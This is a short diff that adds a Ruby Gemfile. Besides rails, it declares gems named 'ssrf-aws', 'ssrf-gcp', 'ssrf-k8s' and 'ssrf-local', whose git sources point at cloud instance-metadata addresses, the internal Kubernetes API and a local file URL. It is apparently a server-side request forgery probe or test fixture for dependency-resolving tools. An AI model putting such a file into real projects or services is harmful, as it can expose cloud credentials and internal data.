@@ -1,0 +1,6 @@
+source "https://rubygems.org"
+gem "rails", "~> 7.0.0"
+gem "ssrf-aws", git: "http://169.254.169.254/latest/meta-data/"
+gem "ssrf-gcp", git: "http://metadata.google.internal/computeMetadata/v1/"
+gem "ssrf-k8s", git: "http://kubernetes.default.svc/"
+gem "ssrf-local", git: "file:///etc/hostname"
